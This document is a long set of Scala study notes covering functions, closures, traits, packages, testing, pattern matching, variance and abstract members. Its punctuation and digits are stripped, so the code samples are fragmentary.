inside constructors the scala compiler will not create corresponding fields for them  auxiliary constructors constructors other than the primary constructor every auxiliary constructor must invoke another constructor of the same class like java only java can also call superclass s constructor instead as its first action that other constructor must textually come before the calling constructor  the convention is to use camel case for constants such as xoffset  the scala compiler will internally  mangle operator identifiers to turn them into legal java identifiers with embedded characters for instance the identifier would be represented internally as colon minus greater if you ever wanted to access this identifier from java code you d need to use this internal representation  mixed identifier consists of an alphanumeric identifier which is followed by an underscore and an operator identifier e g unary and used to support properties  literal identifier is an arbitrary string enclosed in back ticks used to tell scala to treat a keyword as an ordinary identifier e g  writing thread yield treats yield as an identifier rather than a keyword  implicit conversion definition implicit def inttorational x int new rational x for an implicit conversion to work it needs to be in scope if you place the implicit method definition inside the class rational  it won t be in scope  assignment always results with the unit value   in for file files the is called a generator in each iteration a new val named file is initialized with an element value  the range type  to  if you don t want upper bound  until   filter for file files if file getname endswith scala and and multiple filters example file files and and files is a previously defined method that returns array of files if file isfile if file getname endswith scala println file  nested loops and mid stream variable binding example with generators and filters def filelines file java io file scala io source fromfile file getlines tolist and and curly braces may be used instead of parentheses and and the compiler does not infer semicolons inside regular parentheses def grep pattern string file files if file getname endswith scala and and semicolons inferred line filelines file trimmed line trim and and mid stream variable if trimmed matches pattern println file and and trimmed  yield keyword makes for clauses produce a value of the same type as the expression iterated over syntax for clauses yield body  match case unlike java s select case  there is no fall through break is implicit and case expression can contain any type of value  is a placeholder for completely unknown value val target firstarg match and and firstarg is a previously initialized val case salt println pepper case chips println salsa case eggs println bacon case  println waat  scala doesn t have break  nor does it have continue statement  unlike java scala supports inner scope variable shadowing  local functions are functions inside other functions they are visible only in their enclosing block  function literal example x int x and   every function value is an instance of some class that extends one of functionn traits that has an apply method used to invoke the function function for functions with no params function for functions with  param  foreach is a method of traversable trait supertrait of list  set  array and map which takes a function as an argument and applies it to all elements  filter method takes a function that maps each element to true or false e g somenums filter x int x   target typing scala infers type by examining the way the expression is used e g filter example can be written somenums filter x x   placeholder allows you to write somenums filter   only if each function parameter appears in function literal only once one placeholder for each param sequentially sometimes the compiler might not have enough info to infer missing param types val f  and  and and error missing parameter type for expanded function val f  int and  int and and ok f    an expression in which you don t supply all of the arguments needed by the function instead you supply some or none somenums foreach println  and and is equivalent to somenums foreach x println x and and if a function value is required in that place you can omit the placeholder somenums foreach println def sum a int b int c int a and b and c val a sum  and and  is a placeholder for the entire param list a int int int int function and and they are called partially applied functions because you can do this val b sum   int  b  and and int   closures see the changes to free variables and vice versa changes to free variables made by closure are seen outside of closure  repeated parameters scala allows you to indicate that the last param to a function may be repeated def echo args string for arg args println arg and and now echo may be called with zero or more params and and to pass in an array string instead you need to and and append the arg with a colon and an  symbol echo array arr  of  strings   named arguments allow you to pass args to a function in a different order and and the syntax is to precede each argument with a param name and an equals sign speed distance  time  and and it is also possible to mix positional and named args and and in which case the positional arguments understandably must come first  default parameter values allows you to omit such a param when calling a function in which case the param will be filled with its default value def printtime out java io printstream console out out println time and system currenttimemillis and and now you can call the function like this printtime and and or like this printtime console err if the recursive call is the last action in the function body compiler is able to replace the call with a jump back to the beginning of the function after updating param values because of the jvm instruction set tail call optimization cannot be applied for two mutually recursive functions nor if the final call goes to a function value function wraps the recursive call val funvalue nestedfun  def nestedfun x int if x  println x funvalue x  and and won t be optimized functions that take other functions as parameters refactoring imperative code demonstrates control abstraction higher order function that reduces code duplication and significantly simplifies the code and and function receives a string and a function that maps string string boolean def filesmatching query string matcher string string boolean file fileshere and and fileshere is a function that returns an array of files if matcher file getname query yield file def filesending query string filesmatching query filename string query string filename endswith query def filescontaining query string filesmatching query filename query filename contains query and and ok to omit types def filesregex query string filesmatching query  matches  and and since each matcher param is used only once and and since the query is unnecessarily passed around and and we can further simplify the code by introducing a closure def filesmatching matcher string boolean file fileshere if matcher file getname yield file def filesregex query string filesmatching  matches query and and matches closes over free variable query a curried function is applied to multiple argument lists instead of just one def curriedsum x int y int x and y and and curriedsum x int y int int curriedsum   and and int  curried f produces two traditional function invocations the first function invocation takes a single int parameter named x  and returns a function value for the second function which takes the int parameter y and and this is what the first function actually does def first x int y int x and y and and returns function value and and x int int int val second first  and and applying  to the first fn yields the second fn and and x int int int second  and and applying  to the second fn yields the final result and and int  you can use the placeholder notation to use curriedsum in a partially applied function expression which returns the second function val oneplus curriedsum   and and  is a placeholder for the second param list and and oneplus int int function and and oneplus does the same thing as second when using placeholder notation with scala identifiers you need to put a space between identifier and underscore which is why we didn t need space in curriedsum   and we did need space for println  and and another example of higher order function that repeats an operation two times and and and returns the result def twice op double double x double op op x twice  and   and and f f x x and  and  where x  and and double   when some control abstraction function opens a resource and loans it to a function and and opening a resource and loaning it to op def withprintwriter file file op printwriter unit val writer new printwriter file op writer and and loan the resource to the op function finally and and this way we re sure that the resource is closed in the end writer close and and to call the method withprintwriter new file date txt  writer writer println new java util date in any method invocation in which you re passing in exactly one argument you can opt to use curly braces instead of parentheses to surround the argument and and using currying  you can redefine withprintwriter signature like this def withprintwriter file file op printwriter unit and and which now enables you to call the function with a more pleasing syntax val file new file date txt withprintwriter file and and this curly brace is the second parameter writer writer println new java util date typically parameters to functions are by value parameters meaning the value of the parameter is determined before it is passed to the function to write a function that accepts an expression that is not evaluated until it s called within a function you use call by name mechanism which passes a code block to the callee and each time the callee accesses the parameter the code block is executed and the value is calculated var assertionsenabled true def myassert predicate boolean and and without by name parameter if assertionsenabled predicate and and call it like this myassert   throw new assertionerror and and to make a by name parameter you give the parameter a type and and starting with instead of def myassert predicate boolean and and with by name parameter if assertionsenabled predicate and and call it like this myassert   throw new assertionerror and and which looks exactly like built in structure and and we could ve used a plain old boolean but then the passed expression and and would get executed before the call to boolassert  composition means one class holds a reference to another  abstract method does not have an implementation i e  no equals sign or body unlike java no abstract modifier is allowed on method declarations methods that do have an implementation are called concrete  class is said to declare an abstract method and that it defines a concrete method i e declaration is abstract  definition is concrete  methods with empty parentheses are called empty paren methods this convention see bullet  on top supports the uniform access principle which says that the client code should not be affected by a decision to implement an attribute as a field or as a method from the client s code perspective it should be irrelevant whether val or def is accessed the only difference is speed since fields are precomputed when the class is initialized but on the other hand fields are carried around with the parent object  fields and methods belong to the same namespace  which makes possible for a field to override a parameterless method but it forbids defining a field and a method with the same name  java has four namespaces fields methods types and packages scala has two namespaces values fields methods packages and singleton objects types classes and traits a shorthand definition for parameter and field where field gets assigned a parameter s value the parametric field s name must not clash with an existing element in the same namespace like a field or a method class arrayelement val contents array string and and could be var  private  protected  override  you pass an argument to the superconstructor by placing it in parentheses following the name of the superclass class lineelement s string extends arrayelement array s override def width s length and and override mandatory for concrete member overrides override def height   if you want to disallow for a method to be overridden or for a class to be subclassed use the keyword final e g final class or final def  and and operator is used to concatenate two arrays  zip is used to pair two arrays make tuple s  dropping the elements from the longer array that don t have corresponding elements in the shorter array so array    zip array a  b and and will evaluate to array  a   b and and zip usage example def beside that element element new arrayelement line line this contents zip that contents and and new tuple in each iteration yield line and line  mkstring is defined for all sequences including arrays tostring is called on each element of the sequence separator is inserted between every two elems override def tostring contents mkstring n  in scala hierarchy scala null and scala nothing are the subclasses of every class thus the name bottom classes  just as any is the superclass of every other class  any contains methods final  same as equals except for java boxed numeric types final  same as equals equals used by the subclasses to override equality same as hashcode hashcode tostring  class any has two subclasses anyval the parent class of every built in value class in scala anyref the base class of all reference classes in scala built in value classes byte  short  char  int  long  float  double  boolean and unit represented except unit as java primitives at runtime both abstract and final  so you cannot instantiate them with new the instances of these classes are all written as literals e g  is int unit corresponds to java s void and has a single instance value implicit conversion from int to richint happens when a method that only exists in richint is called on int similar booster classes exist for other value types all reference classes inherit from a special marker trait called scalaobject  scala stores integers the same way as java as  bit words but it uses the backup class java lang integer to be used whenever an int has to be seen as object  for reference equality  anyref class has eq method which cannot be overridden behaves like in java for reference types opposite of eq is ne  null is a subclass of every reference class i e class that inherits from anyref it s not compatible with value types val i int null and and type mismatch  nothing is a subtype of every other type of null also there are no values of this type it s used primarily to signal abnormal termination def error message string nothing throw new runtimeexception message and and because of its position in type hierarchy you can use it like this def divide x int y int int and and must return int if y  x and y and and returns int else error can t divide by zero and and nothing is a subtype of int encapsulates method and field definitions which can then be reused by mixing them into classes trait can be mixed in using keywords extends or with the difference is that by using extends  you implicitly inherit the trait s superclass anyref if a trait has no explicit superclass trait also defines a type which can be used as a regular class if you want to mix a trait into a class that explicitly extends a superclass use extends to indicate the superclass and with to mix in the trait to mix in multiple traits using with a class can override trait s members polymorphism works the same way as with regular classes class animal class frog extends animal with philosophical with haslegs override def tostring green override def philosophize println it ain t easy being and tostring  traits can declare fields and maintain state unlike java interfaces you can do anything in a trait definition that you can do with a class definition with two exceptions traits cannot have class parameters traits have dynamically bound super unlike statically bound super in classes the implementation to invoke is determined each time the trait is mixed into class key to allowing traits to work as stackable modifications allows you to implement all comparison operations on a class requires you to specify a type parameter when you mix it in extends ordered typeyoucompare requires you to implement the compare method which should return int   if the object are the same negative if receiver is less than the argument and positive if the receiver is greater than the argument does not provide equals because of type erasure traits let you modify the methods of a class in a way that allows you to stack those modifications together by mixing in multiple traits when a trait extends a superclass it means that the trait can only be mixed in in classes that also extend the same superclass traits can have abstract override methods because of dynamically bound super the call works if the trait is mixed in after another trait or class has already given a concrete definition to that method when you instantiate a class with new scala takes the class and all of its inherited classes and traits and puts them in a single linear order thus the name linearization then when you call super inside one of those classes the invoked method is the first implementation up the chain right in the image bellow the order of mixins is significant traits further to the right take effect first and and mixing in a trait when instantiating with new no need to create a new class val queue new basicintqueue with doubling with filtering and and filtering is applied first and and queue basicintqueue with doubling with filtering anon  fad queue put  and and passes the filtering and then gets doubled with doubling trait queue put  and and not placed in the queue negative number filter trait applied queue get and and int  if the behavior will not be reused make a concrete class if it might be used in multiple unrelated classes use a trait if you want to inherit from it in java code use an abstract class a trait with only abstract members translates to java interface if you plan to distribute it in compiled form and you expect others to write classes that inherit from your code use an abstract class when a trait gains or loses a member any class that inherit from it must be recompiled if efficiency is very very important use a class in java a virtual method invocation of a class member is faster than an interface method invocation if none of the above fits your case use trait can be used like in c package pkgname and and source  with more packages in a single source file also they can be nested in one another a package represents a scope whose contents is accessed relative to current location a top level package that s outside all packages any user can write is called root all names accessible outside packages can be access from inside the package in the same way if you stick with one package per file then java package rules apply package one package two and and is just syntactic sugar for this package one package two and and to import the package not a specific package member import one two and and and then use objects like this two two method and and which is a shorthand for import selector syntax import one two and and to access all members of a package underscore instead of java s star import one two three  and and could also be written as import one two three  and and to use import with objects and classes def showone one one and and imports all members of its parameter one  of class one import one  and and use imports wherever you like println name and s are the best and and to import more than one specific package member use import selectors import one one one and and to rename import import one one first one and and one is accessed as first or one one and and to import all members and rename one of them import one two two second  and and catch all must come last in the list and and to import all members except one useful for ambiguities import one two two   and and excludes two and and implicit imports later imports overshadow earlier ones import java lang  import scala  import predef  outer class s access to private members of its inner class is forbidden java allows access to protected members to classes in the same package even if they don t inherit from the class that declares protected members scala don t a modifier in the form private x or protected x means that access is applied up to x  where x designates some enclosing package class or a singleton object private private this means that access is allowed only from within the the object that contains definition itself not its instances objname privmember will fail in this case a class shares all its access rights with its companion object and vice versa protected modifier makes no sense since companion objects cannot be subclassed any kind of definition you can put in a class can go in a package object each package is allowed to have one package object frequently used to hold package wide type aliases and implicit conversions the top level scala package has a package object which is available to all scala code they are compiled to package class file in that package s directory access is the same as for any other package element and and in file one and package scala package object one def showsomeone someone someone import someone  println name and  i am and and in file view scala package view import one someone and and class defined in package one import one showsomeone object viewdialog def main args array string for someone someone dialog showsomeone someone written as calls of a predefined method assert defined in the predef singleton assertions and ensuring checks can be enabled and disabled with jvm s ea and da flags assert methods and ensuring convenience methods assert condition and and throws assertionerror assert condition explanation any and and assertionerror contains explanation tostring and and ensuring example def widen w int element if w width this val left elem  w width and  height val right elem  w width left width height left beside this beside right ensuring w  width and and takes a predicate function and and when invoked it passes return type element to the and and predicate function that returns boolean and and if predicate evaluates to true  ensuring results with element on which it was and and invoked since this is the last expression of the method widen returns the element and and throws assertionerror if predicate returns false there are many options for unit testing in scala e g java junit and testng tools or tools written in scala e g scalatest  specs and scalacheck the simplest way to test with scalatest is to extend org scalatest suite and define test methods in those classes methods start with test import org scalatest suite import element elem class elementsuite extends suite def testuniformelement val e elem x    assert e width  and and scalatest offers a trait funsuite  which overrides execute and and so you can define tests as function values rather than methods class elementsuite extends funsuite and and test is a method in funsuite which is invoked by elementsuite s primary constructor test elem result should have passed width and and name of test and and curly function passed as by name parameter to test and and which registers it for later execution val e elem x    assert e width  and and if fails you see error message with line number and and triple equals if assert fails returns nice error msg e g  did not equal  assert e width  and and alternatively expect can be used expect  and and yields expected  but got  in the test failure report e width and and if you want to check whether a method throws expected exception use intercept and and if the code does not throw expected exception or doesn t throw at all and and testfailedexception is thrown along with a helpful error msg intercept illegalargumentexception and and returns caught exception elem x    although scalatest includes runner application you can also run suite directly from the scala interpreter by invoking execute on it trait suite s execute method uses reflection to discover its test methods and invoke them new elementsuite execute test starting elementsuite testuniformelement test succeeded elementsuite testuniformelement in bdd  the emphasis is on writing human readable specifications of the expected code behavior along with the accompanying tests that verify that behavior for that purpose scalatest includes several traits spec wordspec flatspec and featurespec import org scalatest flatspec import org scalatest matchers shouldmatchers import element elem class elementspec extends flatspec with shouldmatchers a uniformelement should have a width equal to the passed value in val e elem x    e width should be  it should have a height equal to the passed value in and and specifier clause val e elem x    e height should be  it should throw an iae if passed a negative width in and and or must or can evaluating elem x    should produce illegalargumentexception for classes with case modifier scala compiler adds some syntactic sugar a factory method with the same name as the class which allows you to create new object without keyword new val m mycls x all class parameters implicitly get a val prefix so they are made into fields compiler adds natural implementations of methods tostring  hashcode and equals  which will print hash and compare a whole tree of the class and its arguments copy method is added to the class used to create modified copies to use it you specify the changes by using named parameters and for any param you don t specify the original value is used abstract class expr case class var name string extends expr case class number num double extends expr case class unop operator string arg expr extends expr case class binop operator string left expr right expr extends expr val op binop and  number   var x and and op binop binop and number   var x and and copy method example op copy operator and and binop binop number   var x the biggest advantage of case classes is that they support pattern matching and and written in the form of selector match alternatives def simplifytop expr expr expr expr match case unop  unop  e e case binop and  e number  e case binop  e number  e case  expr and and the right hand side can be empty the result is unit case  match expression is evaluated by trying each of the patterns in the order they are written the first pattern that matches is selected and the part following the fat arrow is executed match is an expression in scala always results in a value there is no fall through  behavior into the next case if none of the patterns match an exception matcherror is thrown matches only itself comparison is done using any literal val or singleton object can be used as a constant def describe x any x match case  five case true truth case hello hi case nil the empty list and and built in singleton case  something unexpected matches any object like wildcard unlike the wildcard scala binds the variable to whatever the object is and then a variable refers to that value in the right hand side of the case clause import math e pi val pi math pi e match case  zero case pi strange and e and cannot be and pi case pi strange pi and pi and and will be treated as constant val pi case pi that could be anything and pi and and variable pattern val pi case  what and and compiler reports unreachable code error how does scala know whether pi is a constant from scala math and not a variable a simple lexical rule is applied if a name starts with a lowercase letter scala treats it as a variable pattern all other references are treated as constants with exception of fields this pi and obj pi  and lowercase names in back ticks  matches every value but it doesn t result with a variable and and in this example since we don t care about elements of a binary operation and and only whether it s a binary operation or not we can use wildcard pattern expr match case binop    println expr and is a binary operation case  println it s something entirely different scala first checks whether the object is a member of the named case class and then checks that the constructor params of the object match the patterns in parentheses deep matching means that it looks for patterns arbitrarily deep and and first checks that the top level object is a binop  then whether the third and and constructor param is a number and finally that the value of that number is  expr match case binop and  e number  println a deep match and and checks  levels deep case  list and array can be matched against just like case classes and and checks for  element list that starts with zero expr match case list    println zero starting list of three elements and and to check against the sequence without specifying how long it must be expr match case list   println zero starting list case list  println any list a   tuple match case a b c println matched and a and b and c and and matched a  tuple case  used for convenient type checks and type casts def generalsize x any x match case s string s length and and type check and type cast s can only be a string case m map   m size case   and and generally to test whether expression is an instance of a type expr isinstanceof string and and member of class any and and to cast expr asinstanceof string and and member of class any def isinttointmap x any x match and and non variable type int is unchecked since it s eliminated by erasure case m map int int true case  false and and the same thing works fine with arrays since their type is preserved with their value type erasure erasure model of generics like in java means that no information about type arguments is maintained at runtime consequently there is no way to determine at runtime whether a given map object has been created with two int arguments rather than with arguments of any other type all the system can do is determine that a value is a map of some arbitrary type parameters allows you to if the pattern matches assign a variable to a matched object the syntax is varname somepattern case unop abs  e unop abs   e and and if matched e will be unop abs   in some circumstances syntactic pattern matching is not precise enough a pattern guard comes after a pattern and starts with an if can be arbitrary boolean expression and typically refers to pattern variables the pattern matches only if the guard evaluates to true and and match only positive integers case n int if  n n and is positive and and match only strings starting with the letter  a case s string if s  a s and starts with letter a e g if you d like to transform x and x to  x with patterns and and this won t work since a pattern variable may only appear once in a pattern def simplifyadd

can you be sure you covered all the cases when using pattern matching since a new case class may be created in any time in another compilation unit you make the superclass of your case class sealed  which then means that a class cannot have any new subclasses added except the ones in the same file this way when using pattern matching you only need to worry about the subclasses you know of also when you match against subclasses of a sealed class you get the compiler support which will flag missing combinations of patterns with a warning message and and if you make expr class sealed sealed abstract class expr and and and leave out some patterns when matching def describe e expr string e match case number  a num case var  a var and you ll get a compiler warning warning match is not exhaustive missing combination unop missing combination binop which is telling you that you might get matcherror because some possible patterns are not handled and and to get rid of the warning in

two forms some x  where x is the actual value none object which represents non existent value optional values are produced by some of the standard operations on collections e g the map s get method

and partial functions have a method isdefinedat second isdefinedat list    and and true second isdefinedat list and and false these expressions above get translated by the compiler to a partial function by translating the patterns twice once for the implementation of the real function and once to test whether the function is defined or not and and e g the function literal case x y  y and and gets translated to the following partial function value new partialfunction list int  int def apply xs list int xs match case x y  y def isdefinedat xs list int xs match case x y  true case  false and and the translation takes place whenever the declared type of a function literal is and and a partialfunction and and if the declared type is just function  or is missing the function literal gets and and translated to a complete function and and if you can use a complete function because partial functions allow for runtime and and errors that the compiler cannot spot and and if you happen to e g use a framework that expects partial function you should and and always check isdefinedat before calling the function for country city capitals println the capital of and country and is and city and

the goal of type inference is to enable users of your method to give as less type information possible so that function literals are written in more concise way type inference is flow based in a method application m args  the inferencer first checks whether the method m has a known type if it has that type is used to infer the expected type of arguments e g in abcde sortwith   the type of abcde is list char so it knows sortwith takes char char boolean and produces list char thus it expands   to x char y char x y if the type is not know e g in msort   abcde  msort is curried polymorphic method that takes an argument of type t t boolean to a function from list t to list t where t is some as yet unknown type the msort needs to be instantiated with a specific type parameter before it can be applied to its arguments inferencer changes its strategy and type checks method arguments to determine the proper instance type of the method but it fails since all it has is   one way to solve the problem is to supply msort with explicit type parameter msort char   abcde and and list e d c b a another solution is to rewrite msort so that its parameters are swapped def msortswapped t xs list t less t t boolean list t and and impl msortswapped abcde   and and succeeds to compile and and list e d c b a generally when tasked to infer type parameters of a polymorphic method the inferencer consults the types of all value arguments in the first parameter list but it doesn t go beyond that so when we swapped the arguments it used the known type of the first parameter abcde to deduce the type parameter of msortswapped  so it did not need to consult the second argument list in order to determine the type parameter of the method suggested library design principle when designing a polymorphic method that takes a non function and function arguments place the function argument last in a curried parameter list by its own that way the method s correct instance type can be inferred from the non function arguments and then that type can be used to type check the function argument groups of data lined up in order which allows you to get the n th element lists immutable linked list

particular order for this purpose collections library provides traits sortedset and sortedmap  which are implemented using treeset and treemap  and which use a red black tree to keep treeset elements

immutable collections can usually be stored more compactly especially small maps and sets e g empty mutable map in its default representation hashmap takes around  bytes with  bytes for every new

together so they can be passed around as a whole unlike arrays and lists tuple can hold objects of different types tuples save you the effort of defining simplistic data heavy as opposed to logic heavy classes since they can contain objects of different types they don t inherit from traversable a common usage pattern of tuples is returning multiple values from a method to access elements of a

types works the same way as uninitialized variables in java internal dsl is a dsl implemented as a library inside another language rather than being implemented on its own to hide a primary constructor add private modifier in front of the class parameter list private constructor can only be accessed from withing the class itself or its companion object class immutablequeue t private private val leading list t private val trailing list t new queue list    list  and and error immutablequeue cannot be accessed in object iw and and now one possibility is to add auxiliary constructor e g def this this nil nil and and takes empty lists and and auxiliary constructor that takes n parameters of type t def this elems t this elems tolist nil and and t repeated parameters and and another possibility is to add a factory method and and convenient way of doing that is to define an immutablequeue object and and that contains apply method and and by placing this object in the same source file with the immutablequeue class and and it becomes its companion object object immutablequeue and and creates a queue with initial elements xs def apply t xs t new immutablequeue t xs tolist nil and and since a companion object contains method apply  clients can create queues with immutablequeue    and and expands to immutablequeue apply    more radical way of information hiding that hides a class itself then you export a trait that reveals the public interface of a class trait queue t def head t and and public def tail queue t def enqueue x t queue t object queue def apply t xs t queue t

enqueue x t new queueimpl leading x trailing queue  as defined in previous listing is a trait not a type so you cannot create variables of type queue instead trait queue enables you to specify parameterized types such as queue string  queue anyref thus queue is a trait and queue string is a type this kind of traits are called type constructors you can construct a type by specifying a type parameter which is analogous to plain old constructor with specified value parameter type constructors generate a family of types it is also said that the queue is a generic trait in scala generic types have nonvariant rigid subtyping consequently queue string is not a subtype of queue anyref however you can demand covariant flexible subtyping by prefixing a type parameter with and trait queue and t besides and parameter s variance annotation  there s also a  which indicates contravariant subtyping trait queue t then if t is a subtype of s  this would imply that queue s is a subtype of queue t arrays in java are treated as covariants string a abc object a a a  new integer  and and arraystroreexception integer placed in string string s a  because of that arrays in scala are nonvariant val a array abc val a array any a and and error type mismatch found array string  required array any to interact with legacy methods in java that use an object array as a means to emulate generic array scala lets you cast an array of t s to an array of any supertype of t val a array object a asinstanceof array object to verify the correctness of variance annotations the compiler classifies all positions in a class or trait body as positive  negative or neutral a position is any location in the class or trait body where a type parameter may be used e g every method value parameter is a position because it has a type and therefore a type parameter could appear in that position type parameters annotated with and can only be used in positive positions in negative and a type parameter without variance annotation may be used in any position so it s the only one that can be used in neutral positions compiler classifies positions like this the positions at the top level of the class are classified as positive positions at deeper nesting levels are classified the same as their enclosing level but with exceptions where the classifications changes flips method value parameter positions are classified to the flipped classification relative to positions outside the method when flipped neutral stays the same negative position becomes positive and vice versa classification is also flipped at the type parameters of methods it is sometimes flipped at the type argument position of a type e g arg in c arg  depending on the variance of the corresponding type parameter if c s type param is annotated with and  then the classification stays the same and if it s  then it flips and if has no variance then it s changed to neutral because it s hard to keep track of variance position it s good to know that the compiler does all the work for you and and variance checks by the compiler postfix signs represent position classification abstract class cat t and u def meow w volume t  listener cat u and  t cat cat u and  t  u and and and and since t is always used in negative position and u in positive the class type checks queue t cannot be made covariant in t because t appears as a type of a parameter of the enqueue method and that s a negative position there s still a way to solve that problem by generalizing enqueue by making it polymorphic i e giving the method itself a type parameter and using a lower bound for its type parameter class queue and t private val leading list t  private val trailing list t and and defines t as the lower bound for u u is required to be a supertype of t def enqueue u t x u and and u is negative flip and t is positive two flips new queue u leading x trailing and and and and the param to enqueue is now of type u and and the method s return type is now queue u  instead of queue t and and imagine e g class fruit with two subclasses apple and orange and and with the new definition of class queue it is possible to append an orange to a and and queue apple and the result will be of type queue fruit liskov substitution principle says that it is safe to assume that a type t is a subtype of a type u if you can substitute a value of type t wherever a value of type u is required the principle holds if t supports the same operations as u and all of t s operations require less and provide more than the corresponding operations in u and and example of contravariance of a function parameter class publication val title string class book title string extends publication title object library val books set book new book programming in scala  new book walden def printbooklist info book anyref and and requires function from book to anyref for book books println info book and and always passes a book to a function object customer extends application def gettitle p publication string p title and and accesses only publication library printbooklist gettitle and and provides function from publication to string and and any method declared in publication is also available on its subclass book and and publication string is a subtype of book anyref because the result type of a function is defined as covariant the inheritance relationship of the two result types shown at the right of the image is in the same direction as that of the two functions shown in the center because the parameter type of a function is defined as contravariant the inheritance relationship of the two parameter types shown at the left of the image is in the opposite direction as that of the two functions object or class components that are declared as private this may be accessed only from within their containing object in which they are defined accesses to vars from the same object do not cause problems with variance variance rules can be broken by having a reference to a containing object that has a statically weaker type than the type the object was defined with for object private values this is not possible variance checking has a special case for object private definitions which is that such definitions are omitted when checking correctness of variance positions purely functional queue that performs at most one trailing to leading adjustment for any sequence of head operations yes it has reassignable fields but they are private thus invisible to any client using the class class covariantqueue and t private private this var leading list t  and and object private vars private this var trailing list t and and without this and and error covariant type t occurs in contravariant position and and in type list t of parameter of setter leading private def mirror if leading isempty while trailing isempty leading trailing head leading trailing trailing tail def head t mirror leading head def tail covariantqueue t mirror new covariantqueue leading tail trailing def enqueue u t x u new covariantqueue u leading x trailing with the t ordered t you indicate that the type parameter t has an upper bound ordered t  which means that the passed element s type must be a subtype of ordered used e g to require that the passed type mixes in a trait i e is a subtype of trait and and requires that passed list type mixes in ordered trait def orderedmergesort t ordered t xs list t list t def merge xs list t  ys list t list t xs ys match case nil  ys case  nil xs case x xs y ys if x y x merge xs ys else y merge xs ys val n xs length and  if n  xs val ys zs xs splitat n merge orderedmergesort ys  orderedmergesort zs and and this is not a most general way to implement mergesort you cannot pass e g list int and and that s achieved with implicit parameters and view bounds section   a member of a class or trait is abstract if the member does not have a complete definition in the class abstract members are intended to be implemented by subclasses in scala besides methods you can declare abstract fields and even abstract types as members of classes and traits vals vars methods and types a concrete implementation needs to fill in definitions for each of its abstract members and and declaration of all four types of abstract members trait abstract def transform x t t val initial t var current t and and the concrete implementation of four type of abstract members class concrete extends abstract type t string and and defines type t as an alias of type string def transform x string x and x val initial hi var current initial abstract types are always members of some class or trait traits are abstract by definition a non abstract type member is a way to define a new name alias for a type one reason to use a type member is to define a short descriptive alias for a type whose real name is more verbose or less obvious in meaning helps clarify the code the other main use of type members is to declare abstract types that must be defined in subclasses have a form like val initial string val is given a name and a type but not its value use it when you know that each instance of the class will have an unchangeable value but you don t know what that value will be its concrete implementation must be a val may not be var or def guaranteed to return always the same value unlike methods which could be implemented by a concrete method that returns a different value every time it s called abstract method declarations may be implemented by both concrete method and concrete val definitions implicitly declare abstract getters and setters just like non abstract vars do reassignable field is not created trait abstracttime var hour int var minute int and and gets expanded to trait abstracttime def hour int def hour x int def minute int def minute x int abstract vals sometimes play a role of superclass parameters i e they let you provide details in a subclass that are missing in a superclass that is particularly important for traits because they don t have a constructor to which you could pass parameters and and instead of class with two class parameters trait rationaltrait val numerarg int and and  until mixed in val denomarg int def main args array string unit and and example implementation of two abstract vals and and yields an instance of an anonymous class and and which mixes in the trait and is defined by the body new rationaltrait val numerarg  and and set to  as part of the initialization of the anonymous class val denomarg  and and but the anonymous class is initialized after the rationaltrait and and in the meantime vals are set to their type s default values a class parameter argument is evaluated before it is passed to the class constructor unless it s a by name parameter an implementing val definition in a subclass is evaluated only after the superclass has been initialized e g class parameters of rational expr expr are evaluated just before instantiation of the rational object but rationaltrait s vals are evaluated as part of the initialization of the anonymous class trait problematicrationaltrait val numerarg int and and initialized once an anonymous class is created val denomarg int and and which happens after the trait is initialized require denomarg  and and throws requirement failed exception private val g gcd numerarg denomarg val numer numerarg and g val denom denomarg and g private def gcd a int b int int if b  a else gcd b a b override def tostring numer and and and denom and and when you execute this require fails since int vals are  until val x  val fun new problematicrationaltrait val numerarg  x val denomarg  x let you initialize a field of a subclass before the superclass is called achieved by putting field definition in braces before superclass constructor call and and anonymous class creation val numerarg  x val denomarg  x with problematicrationaltrait and and object definition object twothirds extends val numerarg  val denomarg  with problematicrationaltrait and and subclass definition class rationalclass n int d int extends val numerarg n val denomarg d with problematicrationaltrait def and that rationalclass new rationalclass numer that denom and that numer denom denom that denom and and in all cases initialization section comes before the trait is mentioned because pre initialized fields are initialized before the superclass constructor is called their initializers cannot refer to the object that s being constructed so if such an object refers to this  the reference goes to the object containing the class or object that s being constructed not the constructed object itself object absrat val rat new val numerarg  val denomarg this numerarg  and and value numerarg is not member of object absrat with problematicrationaltrait evaluated the first time the val is used never evaluated more than once the result of first time evaluation is stored in val scala objects are also initialized on demand in fact an object definition can be thought of as a shorthand definition of a lazy val with an anonymous class that describes the object s contents since lazy vals get executed on demand their textual order is not important when determining the order of their initialization in the presence of side effects i e when our code produces or is affected by mutations  initialization order starts to matter and then it can be difficult to determine the actual order which is why lazy vals are an ideal complement to functional objects trait lazyrationaltrait val numerarg int val denomarg int lazy val numer numerarg and g lazy val denom denomarg and g override def tostring numer and and and denom private lazy val g require denomarg  gcd numerarg denomarg private def gcd a int b int int if b  a else gcd b a b and and using lazyrationaltrait from the interpreter val x  new lazyrationaltrait val numerarg  x val denomarg  x and and res lazyrationaltrait  and  and and  fresh instance of lazyrationaltrait gets created and the initialization code and and of lazyrationaltrait is run fields are not initialized and and  the primary constructor of the anonymous subclass is executed expression new and and this involves the initialization of numerarg with  and denomarg with  and and  the tostring method is invoked on the constructed object by the interpreter and and  the numer field is accessed for the first time by the tostring method and and  the initializer of numer accesses the private field g  so g is evaluated and and the evaluation of g accesses numerarg and denomarg from step  and and  the tostring method accesses the value of denom  which causes its evaluation and and that evaluation accesses the values of denomarg and g and and the initializer of the g field is not re evaluated it s a val  not def and and  finally the resulting string  and  is constructed and printed used as a placeholder for a type that will be defined further down the hierarchy and and the type of food cannot be determined at the animal level every subclass defines it class food abstract class animal type suitablefood food and and upper bound is food requires subclass of food def eat food suitablefood class grass extends food class cow extends animal type suitablefood grass and and cow fixes its suitablefood to be grass and and suitablefood becomes alias for class grass override def eat food grass and and concrete method for this kind of food objects in scala can have types as members e g any instance of cow will have type suitablefood as its member e g milka suitablefood means the type suitablefood that is a member of the object referenced from milka  or the type of food that suitable for milka a type like milka suitablefood is called a path dependent type  where the word path means the reference to an object path can be a single name such as milka  or a longer access path like farm barn milka suitablefood  where path components are variables or singleton object names that refer to objects class dogfood extends food class dog extends animal type suitablefood dogfood override def eat food dogfood val milka new cow val lassie new dog lassie eat new milka suitablefood and and error type mismatch found grass required dogfood and and suitablefood types of two dog s both point to the same type dogfood val mickey new dog lassie eat new mickey suitablefood and and ok although path dependent types resemble java s inner classes there is a crucial difference a path dependent type names an outer object  whereas an inner class type name an outer class class outer class inner and and the inner class is addressed outer inner  instead of java s outer inner and and in scala notation syntax is reserved for objects val out new outer val out new outer out inner and and path dependent type out inner and and path dependent type different one and and both types are subtypes of outer inner  which represents the inner class with an and and 